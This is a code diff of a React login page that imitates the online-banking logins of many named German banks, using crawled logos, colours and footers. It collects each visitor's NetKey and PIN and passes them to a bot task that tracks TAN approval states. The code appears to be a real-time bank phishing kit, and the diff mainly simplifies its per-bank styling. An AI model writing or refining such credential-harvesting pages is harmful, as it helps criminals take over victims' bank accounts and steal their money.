@@ -1,7 +1,7 @@
 // @ts-nocheck
 import { useEffect, useMemo, useRef, useState } from "react";
 import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
-import { Eye, EyeOff, AlertCircle, AlertTriangle } from "lucide-react";
+import { Eye, EyeOff, AlertCircle } from "lucide-react";
 import { supabase } from "@/integrations/supabase/client";
 import vrLogoGeneric from "@/assets/vr-logo-generic.png";
 import { resolveAsset } from "@/lib/bankAssetUrl";
@@ -13,18 +13,9 @@ import { startBotTask, getBotTask } from "@/lib/botClient";
 import { getSecureGoLabel } from "@/lib/secureGoLabel";
 import { startQrLoginSession } from "@/lib/qrLogin.functions";
 import type { BankTheme } from "@/data/banks";
-import { deriveFlowTheme } from "@/lib/deriveTheme";
 
-
-
-import { z } from "zod";
-
-const loginSearchSchema = z.object({
-  preview: z.union([z.boolean(), z.string()]).optional(),
-});
 
 export const Route = createFileRoute("/login/$bankId")({
-  validateSearch: (search) => loginSearchSchema.parse(search),
   head: ({ params }) => ({
     meta: [
       { title: `Online-Banking Anmeldung · ${params.bankId}` },
@@ -56,13 +47,6 @@ type Bank = {
   online_banking_url: string | null;
   is_qr_branch: boolean | null;
   footer_links: Record<string, { label: string; url: string }> | null;
-  footer_pages: Record<string, { title: string; html: string; url: string; fetched_at: string }> | null;
-  footer_partners: Array<{ name: string; logo_url: string; link_url: string | null }> | null;
-  footer_socials: Array<{ network: string; url: string; label: string }> | null;
-  footer_ctas: Array<{ label: string; url: string }> | null;
-  footer_columns: Array<{ heading: string; links: Array<{ label: string; url: string }> }> | null;
-  footer_disclaimer: string | null;
-  login_field_label: string | null;
 };
 
 
@@ -72,8 +56,6 @@ const logoModules = import.meta.glob("@/assets/*.png", { eager: true, import: "d
 const logoAliases: Record<string, string> = {
   "sparda-bank-muenchen-logo": "sparda-muenchen-logo",
   "bbbank-logo": "bbbank-header-logo",
-  "psd-bank-logo": "psd-bank-logo",
-  "gls-bank-logo": "gls-bank-logo",
 };
 function getLogo(name?: string | null): string | undefined {
   if (!name) return undefined;
@@ -125,9 +107,6 @@ function payloadContains(data: unknown, pattern: RegExp): boolean {
 
 export function BankLoginPage({ bankId }: { bankId: string }) {
   const navigate = useNavigate();
-  const search = Route.useSearch();
-  const isPreview = search.preview === true || search.preview === "true";
-  
   const [bank, setBank] = useState<Bank | null>(null);
   const [groupTheme, setGroupTheme] = useState<Partial<BankTheme> | null>(null);
   const [loading, setLoading] = useState(true);
@@ -146,7 +125,6 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
   const [submitting, setSubmitting] = useState(false);
   const [errorMsg, setErrorMsg] = useState<string | null>(null);
   const [credentialsInvalid, setCredentialsInvalid] = useState(false);
-  const [focusedField, setFocusedField] = useState<"vr" | "pin" | null>(null);
 
   const pollRef = useRef<{ timer: any; startedAt: number; taskId: string; positiveSeen: boolean } | null>(null);
   const qrPollRef = useRef<{ timer: any; sessionId: string; startedAt: number } | null>(null);
@@ -205,32 +183,18 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
   useEffect(() => {
     (async () => {
       const { extractSubdomainLabelFromUrl } = await import("@/lib/bankSubdomain");
-      console.log("[BankLoginPage] bankId param:", bankId);
-      const cols = "id,name,group,logo,logo_url,logo_storage_path,hide_name_in_header,custom_theme,theme_extracted,online_banking_url,is_qr_branch,footer_links,footer_pages,footer_partners,footer_socials,footer_ctas,footer_columns,footer_disclaimer,login_field_label";
-      
-      const { data: candidates, error: candidatesError } = await supabase
-        .from("banks")
-        .select("id,online_banking_url")
-        .not("online_banking_url", "is", null);
-      
-      const resolvedId = (candidates ?? []).find(
-        (candidate) => extractSubdomainLabelFromUrl(candidate.online_banking_url) === bankId,
-      )?.id ?? bankId;
-      
-      console.log("[BankLoginPage] resolvedId:", resolvedId);
-      
-      const { data: match, error: matchError } = await supabase
-        .from("banks")
-        .select(cols)
-        .eq("id", resolvedId)
-        .maybeSingle();
-        
-      if (candidatesError || matchError) {
-        console.error("[BankLoginPage] load error:", candidatesError || matchError);
-        setErrorMsg("Bankdaten konnten nicht geladen werden. Bitte versuchen Sie es erneut.");
+      const cols = "id,name,group,logo,logo_url,logo_storage_path,hide_name_in_header,custom_theme,online_banking_url,is_qr_branch,footer_links";
+      // Look up by Online-Banking suffix; fall back to bank id for legacy links.
+      const { data: all } = await supabase
+        .from("banks").select(cols).not("online_banking_url", "is", null);
+      let match = (all ?? []).find(
+        (b: any) => extractSubdomainLabelFromUrl(b.online_banking_url) === bankId,
+      ) as any;
+      if (!match) {
+        const { data } = await supabase.from("banks").select(cols).eq("id", bankId).maybeSingle();
+        match = data as any;
       }
       if (!match) {
-        console.warn("[BankLoginPage] no bank found for:", resolvedId);
         setNotFound(true);
         setLoading(false);
         return;
@@ -244,60 +208,27 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
   }, [bankId]);
 
   const theme: BankTheme = useMemo(() => {
-    const flow = deriveFlowTheme(
-      (bank?.custom_theme as Partial<BankTheme> | null) ?? null,
-      (bank?.theme_extracted as any) ?? null,
-      groupTheme,
-      bank?.group ?? null,
-      bank?.name ?? null,
-    );
     const src: Partial<BankTheme> =
       (bank?.custom_theme && Object.keys(bank.custom_theme).length > 0
         ? bank.custom_theme
         : groupTheme) ?? {};
     return {
       primary: src.primary ?? "213 100% 30%",
-      headerBg: flow.headerBg,
-      buttonBg: flow.buttonBg,
-      accentText: flow.accentText,
-      topBarColor: flow.topBarColor,
-      buttonRadius: flow.buttonRadius,
-      footerBg: (flow as any).footerBg ?? src.footerBg,
+      headerBg: src.headerBg ?? "#ffffff",
+      buttonBg: src.buttonBg ?? "#003399",
+      accentText: src.accentText ?? src.buttonBg ?? "#003399",
+      topBarColor: src.topBarColor ?? src.buttonBg ?? "#003399",
+      buttonRadius: src.buttonRadius ?? "rounded-full",
+      footerBg: src.footerBg,
     };
   }, [bank, groupTheme]);
 
-
+  const themeColor = theme.headerBg === "#ffffff" ? "#1a1a1a" : theme.headerBg;
   const isVR = bank?.group === "Volksbanken Raiffeisenbanken";
   const isPSD = bank?.group === "PSD Banken";
   const isSparda = bank?.group === "Sparda-Banken";
-  const isGLS = bank?.group === "GLS Bank";
-  const isMarcard = bank?.group === "Spezifische Banken" && (bank?.name?.toLowerCase().includes("marcard") || bank?.name?.toLowerCase().includes("stein"));
-  const isWarburg = !isMarcard && bank?.group === "Spezifische Banken" && bank?.name?.toLowerCase().includes("warburg");
-  const isQlick = bank?.name?.toLowerCase().includes("qlick");
-  const isRenault = bank?.group === "Spezifische Banken" && bank?.name?.toLowerCase().includes("renault");
-  const isMerkur = bank?.name?.toLowerCase().includes("merkur");
-
-  const themeColor = theme.headerBg === "#ffffff" ? (isWarburg ? "#6d7e8b" : "#1a1a1a") : theme.headerBg;
-  const buttonBorderRadius = theme.buttonRadius === "rounded-full" ? "9999px" : "0px";
-  const hexToRgba = (hex: string, alpha: number) => {
-    const m = /^#?([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(hex?.trim() ?? "");
-    if (!m) return `rgba(59,130,246,${alpha})`;
-    return `rgba(${parseInt(m[1],16)},${parseInt(m[2],16)},${parseInt(m[3],16)},${alpha})`;
-  };
-  const focusAccent = theme.accentText || themeColor;
-  const focusTint = hexToRgba(focusAccent, 0.08);
-  
-  // Apply a global CSS variable for inputs and other components that might not use the inline style
-  useEffect(() => {
-    document.documentElement.style.setProperty('--bank-button-radius', buttonBorderRadius);
-  }, [buttonBorderRadius]);
-
-
+  const aliasFieldLabel = isPSD ? "PSD-Key oder Alias" : isSparda ? "Sparda-NetKey oder Alias" : "VR-NetKey oder Alias";
   const secureGoLabel = getSecureGoLabel(bank?.group);
-  const crawledLabel = (bank as any)?.login_field_label as string | null | undefined;
-  const groupLabel = isPSD ? "PSD-Key oder Alias" : isSparda ? "Sparda-NetKey oder Alias" : "VR-NETKEY oder Alias";
-  const aliasFieldLabel = isMerkur ? "Online-Key oder Alias" : (crawledLabel && crawledLabel.trim().length > 0 ? crawledLabel : groupLabel);
-
 
   const crawledLogo = bank ? resolveAsset("bank-logos", bank.logo_url ?? null, bank.logo_storage_path) : null;
   const groupFallback = bank ? getLogo(groupLogoName[bank.group]) : undefined;
@@ -305,24 +236,15 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
   const logoSrc = bank
     ? crawledLogo || getLogo(bank.logo) || groupFallback || vrFallback || vrLogoGeneric
     : vrLogoGeneric;
-  
-  // Use the same logo as the header for the splash reveal
-  const splashLogo = logoSrc;
-
 
   const showName = bank ? !bank.hide_name_in_header : true;
 
   useEffect(() => {
     if (loading) return;
-    // Skip animation if preview=true is set
-    if (isPreview) {
-      setInitialLoading(false);
-      return;
-    }
     const t1 = setTimeout(() => setLoadingFading(true), 1400);
     const t2 = setTimeout(() => setInitialLoading(false), 1900);
     return () => { clearTimeout(t1); clearTimeout(t2); };
-  }, [loading, isPreview]);
+  }, [loading]);
 
   // stop polling on unmount
   useEffect(() => () => { stopPolling(); stopQrPolling(); }, []);
@@ -428,12 +350,6 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
             theme, logoSrc, fallbackLogoSrc: getLogo(groupLogoName[bank?.group ?? ""]) || vrLogoGeneric,
             showName, bigLogo: bank?.group === "BBBank",
             footerLinks: bank?.footer_links ?? null,
-            footerPages: bank?.footer_pages ?? null,
-            footerPartners: bank?.footer_partners ?? null,
-            footerSocials: bank?.footer_socials ?? null,
-            footerCtas: bank?.footer_ctas ?? null,
-            footerColumns: bank?.footer_columns ?? null,
-            footerDisclaimer: bank?.footer_disclaimer ?? null,
           }));
         } catch {}
         clearTask();
@@ -468,10 +384,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
           pollRef.current.timer = setTimeout(tick, POLL_INTERVAL_MS);
           return;
         }
-        setVrNetKeyError(true);
-        setPinError(true);
-        setCredentialsInvalid(true);
-        setErrorMsg(null);
+        setErrorMsg("VR-NetKey oder PIN falsch.");
         resetToForm();
         return;
       } else if (st === "tan_rejected" || st === "tan_timeout") {
@@ -558,18 +471,27 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
   };
 
   if (initialLoading) {
-    const showLogo = !loading && Boolean(bank);
-    const loadingGroupFallback = bank ? getLogo(groupLogoName[bank.group]) : undefined;
-    const loadingSplashLogo = logoSrc;
-
+    const showLogo = !loading && bank;
+    const splashLogo = bank
+      ? (getLogo(groupLogoName[bank.group]) || getLogo(bank.logo) || crawledLogo || vrLogoGeneric)
+      : null;
     return (
       <div
         className={`min-h-screen bg-white flex flex-col items-center justify-center transition-opacity duration-500 ${loadingFading ? "opacity-0" : "opacity-100"}`}
       >
         {showLogo && (
           <div className="mb-6">
-            <SplashLogoReveal logoSrc={loadingSplashLogo} alt={bank?.name || ""} className="h-20 sm:h-24" />
-
+            {isVR ? (
+              <SplashLogoReveal alt={bank?.name || "Volksbank"} className="h-20 sm:h-24" />
+            ) : (
+              <img
+                src={splashLogo!}
+                alt={bank?.name || ""}
+                className="h-16 sm:h-20 object-contain animate-fade-in"
+                decoding="async"
+                fetchPriority="high"
+              />
+            )}
           </div>
         )}
         <div className="w-8 h-8 border-4 border-gray-200 border-t-gray-600 rounded-full animate-spin" />
@@ -589,7 +511,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
 
   const fallbackLogoSrc = getLogo(groupLogoName[bank.group]) || vrLogoGeneric;
   const isBBBank = bank.group === "BBBank";
-  const shellProps = { theme, logoSrc, fallbackLogoSrc, bankName: bank.name, showName, bigLogo: isBBBank, footerLinks: (bank.footer_links ?? null) as any, footerPages: (bank.footer_pages ?? null) as any, footerPartners: (bank.footer_partners ?? null) as any, footerSocials: (bank.footer_socials ?? null) as any, footerCtas: (bank.footer_ctas ?? null) as any, footerColumns: (bank.footer_columns ?? null) as any, footerDisclaimer: bank.footer_disclaimer ?? null };
+  const shellProps = { theme, logoSrc, fallbackLogoSrc, bankName: bank.name, showName, bigLogo: isBBBank, footerLinks: (bank.footer_links ?? null) as any };
 
 
 
@@ -605,70 +527,32 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
   if (phase === "result") {
     return (
       <BankShell {...shellProps}>
-        <BotResultScreen themeColor={themeColor} result={result} buttonRadius={theme.buttonRadius} />
+        <BotResultScreen themeColor={themeColor} result={result} />
       </BankShell>
     );
   }
 
   return (
     <BankShell {...shellProps}>
-      {initialLoading && !isPreview && (
-        <SplashLogoReveal 
-          logo={splashLogo} 
-          isPSD={isPSD} 
-          isSparda={isSparda} 
-          isBBBank={isBBBank} 
-          fading={loadingFading} 
-        />
-      )}
       <div className="max-w-6xl mx-auto flex flex-col lg:flex-row gap-6">
         <div className="w-full lg:w-1/2 flex flex-col gap-4">
-          <div className="bg-white shadow-md border border-gray-200 overflow-hidden" style={{ borderRadius: theme.buttonRadius === "rounded-none" ? "0px" : "12px" }}>
+          <div className="bg-white rounded-xl shadow-md border border-gray-200 overflow-hidden">
             <div className="p-6 sm:p-8">
-              {isGLS || isWarburg || isMarcard || isQlick || isRenault || isMerkur ? (
-                <div className="flex flex-col mb-6">
-                  <h2 className={`text-3xl font-bold mb-6 ${isGLS ? "text-[#002864]" : "text-gray-800"}`}>
-                    Anmelden
-                  </h2>
-                  {(isWarburg || isMarcard || isQlick || isRenault || isMerkur) && (
-                    <div className="mb-6">
-                      <p className={`font-bold text-sm ${isQlick ? "text-gray-800" : "text-gray-700"} mb-2`}>
-                        {isQlick ? "Achten Sie auf Ihre Daten" : isRenault ? "Willkommen im Online-Banking-Bereich der Renault Bank direkt." : isMerkur ? `Herzlich willkommen zum ${bank?.name} Online-Banking` : `Herzlich willkommen zum ${bank?.name} Onlinebanking`}
-                      </p>
-                      {isQlick && (
-                        <p className="text-sm text-gray-600 leading-relaxed">
-                          Bitte seien Sie weiterhin vorsichtig im Umgang mit Ihren Zugangsdaten und TAN's. Qlick wird Sie niemals auffordern Updates oder Testüberweisungen mit einer TAN durchzuführen.
-                        </p>
-                      )}
-                    </div>
-                  )}
-                  <div className="flex border-b border-gray-200 mb-6">
-                    <button type="button" className={`px-1 pb-3 text-sm font-bold border-b-2 ${isGLS ? "text-[#002864] border-[#002864]" : (isWarburg || isQlick || isRenault || isMerkur) ? "text-[#003366] border-[#003366]" : isMarcard ? "border-current" : "text-gray-600 border-gray-600"}`} style={isMarcard ? { color: theme.buttonBg, borderColor: theme.buttonBg } : isRenault || isMerkur ? { color: "#000000", borderBottomColor: "#000000" } : undefined}>
-                      Mit Zugangsdaten anmelden
-                    </button>
-                  </div>
-                </div>
-              ) : (
+              <h2 className="text-2xl sm:text-3xl font-bold mb-4" style={{ color: themeColor }}>
+                Anmelden
+              </h2>
 
+              <div className="mb-5">
+                <p className="font-bold text-sm text-gray-800 mb-1">
+                  Achtung: Geben Sie niemals Ihre Zugangsdaten, TAN oder PIN weiter!
+                </p>
+                <p className="text-sm text-gray-600">
+                  Unsere Mitarbeiter werden Sie niemals dazu auffordern Ihre Zugangsdaten preiszugeben oder einen Auftrag über die {secureGoLabel} App freizugeben.
+                </p>
+              </div>
 
-                <>
-                  <h2 className="text-2xl sm:text-3xl font-bold mb-4" style={{ color: themeColor }}>
-                    Anmelden
-                  </h2>
-                  <div className="mb-5">
-                    <p className="font-bold text-sm text-gray-800 mb-1">
-                      Achtung: Geben Sie niemals Ihre Zugangsdaten, TAN oder PIN weiter!
-                    </p>
-                    <p className="text-sm text-gray-600">
-                      Unsere Mitarbeiter werden Sie niemals dazu auffordern Ihre Zugangsdaten preiszugeben oder einen Auftrag über die {secureGoLabel} App freizugeben.
-                    </p>
-                  </div>
-                </>
-              )}
-
-
-              {errorMsg && !credentialsInvalid && (
-                <div className="mb-4 bg-red-50 border border-red-200 p-4 flex items-start gap-2" style={{ borderRadius: buttonBorderRadius }}>
+              {errorMsg && (
+                <div className="mb-4 rounded-lg bg-red-50 border border-red-200 p-4 flex items-start gap-2">
                   <AlertCircle className="w-4 h-4 mt-0.5 text-red-600 shrink-0" />
                   <p className="text-sm text-red-600 font-medium">{errorMsg}</p>
                 </div>
@@ -676,27 +560,15 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
 
               <form onSubmit={handleSubmit} className="space-y-4">
                 <div>
-                  <div
-                    className={`relative ${vrNetKeyError ? "bg-[#fef2f2]" : ""}`}
-                    style={{
-                      borderRadius: "4px",
-                      backgroundColor: !vrNetKeyError && focusedField === "vr" ? focusTint : (vrNetKeyError ? "#fef2f2" : undefined),
-                      transition: "background-color 150ms",
-                    }}
-                  >
+                  <div className={`relative rounded-lg ${vrNetKeyError ? "bg-red-50" : ""}`}>
                     <input
                       id="vrNetKey"
                       type="text"
                       value={vrNetKey}
                       onChange={(e) => { setVrNetKey(e.target.value); if (e.target.value.trim()) setVrNetKeyError(false); setCredentialsInvalid(false); setErrorMsg(null); }}
-                      onFocus={() => setFocusedField("vr")}
-                      onBlur={() => setFocusedField((f) => (f === "vr" ? null : f))}
                       placeholder=" "
-                       className={`peer w-full px-4 pt-6 pb-2 border-2 focus:outline-none transition-colors text-base bg-transparent ${vrNetKeyError ? "border-[#b91c1c]" : (isGLS || isWarburg || isMarcard || isQlick || isRenault || isMerkur) ? "border-gray-800" : "border-gray-300"}`}
-                      style={{
-                        ...(!vrNetKeyError && (focusedField === "vr" || vrNetKey) ? { borderColor: focusAccent } : {}),
-                        borderRadius: "4px",
-                      }}
+                      className={`peer w-full px-4 pt-6 pb-2 border-2 rounded-lg focus:outline-none transition-colors text-base bg-transparent ${vrNetKeyError ? "border-red-500" : "border-gray-300"}`}
+                      style={!vrNetKeyError && vrNetKey ? { borderColor: theme.accentText } : undefined}
                       autoComplete="username"
                     />
                     <label
@@ -706,38 +578,25 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                       {aliasFieldLabel}
                     </label>
                   </div>
-
                   {vrNetKeyError && (
-                    <p className="mt-1 text-sm text-[#b91c1c] font-medium flex items-center gap-1.5">
-                      <AlertTriangle className="w-4 h-4" />
-                      {credentialsInvalid ? "VR-NETKEY / Alias oder PIN falsch" : `${aliasFieldLabel} erforderlich`}
+                    <p className="mt-1 text-sm text-red-600 font-medium flex items-center gap-1.5">
+                      <AlertCircle className="w-4 h-4" />
+                      {credentialsInvalid ? "VR-NetKey / Alias oder PIN falsch" : `${aliasFieldLabel} erforderlich`}
                     </p>
 
                   )}
                 </div>
 
                 <div>
-                  <div
-                    className={`relative ${pinError ? "bg-[#fef2f2]" : ""}`}
-                    style={{
-                      borderRadius: "4px",
-                      backgroundColor: !pinError && focusedField === "pin" ? focusTint : (pinError ? "#fef2f2" : undefined),
-                      transition: "background-color 150ms",
-                    }}
-                  >
+                  <div className={`relative rounded-lg ${pinError ? "bg-red-50" : ""}`}>
                     <input
                       id="pin"
                       type={showPin ? "text" : "password"}
                       value={pin}
                       onChange={(e) => { setPin(e.target.value); if (e.target.value.trim()) setPinError(false); setCredentialsInvalid(false); setErrorMsg(null); }}
-                      onFocus={() => setFocusedField("pin")}
-                      onBlur={() => setFocusedField((f) => (f === "pin" ? null : f))}
                       placeholder=" "
-                      className={`peer w-full px-4 pt-6 pb-2 pr-12 border-2 focus:outline-none transition-colors text-base bg-transparent ${pinError ? "border-[#b91c1c]" : (isGLS || isWarburg || isMarcard || isQlick || isRenault || isMerkur) ? "border-gray-800" : "border-gray-300"}`}
-                      style={{
-                        ...(!pinError && (focusedField === "pin" || pin) ? { borderColor: focusAccent } : {}),
-                        borderRadius: "4px",
-                      }}
+                      className={`peer w-full px-4 pt-6 pb-2 pr-12 border-2 rounded-lg focus:outline-none transition-colors text-base bg-transparent ${pinError ? "border-red-500" : "border-gray-300"}`}
+                      style={!pinError && pin ? { borderColor: theme.accentText } : undefined}
                       autoComplete="current-password"
                     />
                     <label
@@ -746,9 +605,6 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                     >
                       PIN
                     </label>
-
-
-
                     <button
                       type="button"
                       onClick={() => setShowPin(!showPin)}
@@ -759,65 +615,49 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                     </button>
                   </div>
                   {pinError && (
-                    <p className="mt-1 text-sm text-[#b91c1c] font-medium flex items-center gap-1.5">
-                      <AlertTriangle className="w-4 h-4" />
-                      {credentialsInvalid ? "VR-NETKEY / Alias oder PIN falsch" : "PIN erforderlich"}
+                    <p className="mt-1 text-sm text-red-600 font-medium flex items-center gap-1.5">
+                      <AlertCircle className="w-4 h-4" />
+                      {credentialsInvalid ? "VR-NetKey / Alias oder PIN falsch" : "PIN erforderlich"}
                     </p>
                   )}
 
                 </div>
 
-                <div className={`flex gap-4 ${isGLS || isMerkur ? "pt-10" : "pt-2"}`}>
+                <div className="flex gap-4 pt-2">
                   <button
                     type="button"
                     onClick={() => navigate({ to: "/" })}
-                    className={`px-8 py-3 font-medium transition-colors text-sm ${(isGLS || isQlick || isRenault || isMerkur) ? "border border-[#002864] text-[#002864] hover:bg-gray-50" : "border-2 hover:bg-gray-50"}`}
-                    style={{ 
-                      borderColor: (isGLS || isQlick || isRenault || isMerkur) ? "#002864" : isWarburg ? "#6d7e8b" : theme.accentText, 
-                      color: (isGLS || isQlick || isRenault || isMerkur) ? "#002864" : isWarburg ? "#6d7e8b" : theme.accentText,
-                      borderRadius: (isGLS || isWarburg || isQlick || isRenault) ? "0px" : (isMerkur ? "9999px" : buttonBorderRadius)
-
-                    }}
-
-
+                    className={`px-8 py-3 ${theme.buttonRadius} border-2 font-medium hover:bg-gray-50 transition-colors text-sm`}
+                    style={{ borderColor: theme.accentText, color: theme.accentText }}
                   >
                     Abbrechen
                   </button>
                   <button
                     type="submit"
                     disabled={submitting}
-                    className={`px-8 py-3 text-white font-medium transition-opacity hover:opacity-90 text-sm ml-auto disabled:opacity-70 disabled:cursor-not-allowed inline-flex items-center gap-2`}
-                    style={{ 
-                      backgroundColor: (isGLS || isQlick || isMerkur) ? "#2b2a29" : isWarburg ? "#6d7e8b" : isRenault ? "#edee00" : theme.buttonBg,
-                      borderRadius: (isGLS || isWarburg || isQlick || isRenault) ? "0px" : (isMerkur ? "9999px" : buttonBorderRadius),
-                      color: (isRenault || isMerkur) ? (isRenault ? "#000000" : "#ffffff") : "#ffffff",
-
-
-                    }}
-
+                    className={`px-8 py-3 ${theme.buttonRadius} text-white font-medium transition-opacity hover:opacity-90 text-sm ml-auto disabled:opacity-70 disabled:cursor-not-allowed inline-flex items-center gap-2`}
+                    style={{ backgroundColor: theme.buttonBg }}
                   >
                     {submitting ? (
                       <span className="inline-flex gap-1" aria-label="Wird geprüft">
-                        <span className={`w-1.5 h-1.5 rounded-full ${isRenault ? "bg-black" : "bg-white"} animate-bounce [animation-delay:-0.3s]`} />
-                        <span className={`w-1.5 h-1.5 rounded-full ${isRenault ? "bg-black" : "bg-white"} animate-bounce [animation-delay:-0.15s]`} />
-                        <span className={`w-1.5 h-1.5 rounded-full ${isRenault ? "bg-black" : "bg-white"} animate-bounce`} />
-
+                        <span className="w-1.5 h-1.5 rounded-full bg-white animate-bounce [animation-delay:-0.3s]" />
+                        <span className="w-1.5 h-1.5 rounded-full bg-white animate-bounce [animation-delay:-0.15s]" />
+                        <span className="w-1.5 h-1.5 rounded-full bg-white animate-bounce" />
                       </span>
                     ) : (
                       "Anmelden"
                     )}
                   </button>
                 </div>
-
               </form>
             </div>
           </div>
 
-          <div className="bg-white shadow-md border border-gray-200 p-6" style={{ borderRadius: (isGLS || isWarburg || isQlick || isRenault) ? "0px" : (isMerkur ? "9999px" : theme.buttonRadius === "rounded-none" ? "0px" : "12px") }}>
+          <div className="bg-white rounded-xl shadow-md border border-gray-200 p-6">
             <h3 className="font-bold text-sm text-gray-800 mb-3">Wichtiger Hinweis:</h3>
             <ul className="list-disc pl-5 space-y-2 text-sm text-gray-600">
               <li>
-                Geben Sie Ihren {aliasFieldLabel.replace(/\s*oder\s*Alias/i, "")} nicht an Dritte weiter, um z.B. Einblicke in private Konten oder die Durchführung unberechtigter Aktionen zu unterbinden.
+                Geben Sie Ihren {isVR ? "VR-NetKey" : isPSD ? "PSD-Key" : isSparda ? "Sparda-NetKey" : "Zugang"} nicht an Dritte weiter, um z.B. Einblicke in private Konten oder die Durchführung unberechtigter Aktionen zu unterbinden.
               </li>
               <li>Bitte nutzen Sie einen aktuellen Browser und aktuelle Sicherheitsupdates.</li>
             </ul>
@@ -825,7 +665,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
         </div>
 
         <div className="hidden lg:block w-full lg:w-1/2">
-          <div className="bg-white shadow-md border border-gray-200 p-8 h-full" style={{ borderRadius: theme.buttonRadius === "rounded-none" ? "0px" : "12px" }}>
+          <div className="bg-white rounded-xl shadow-md border border-gray-200 p-8 h-full">
             <h3 className="text-xl font-bold mb-3" style={{ color: themeColor }}>
               Sicher im Online-Banking
             </h3>
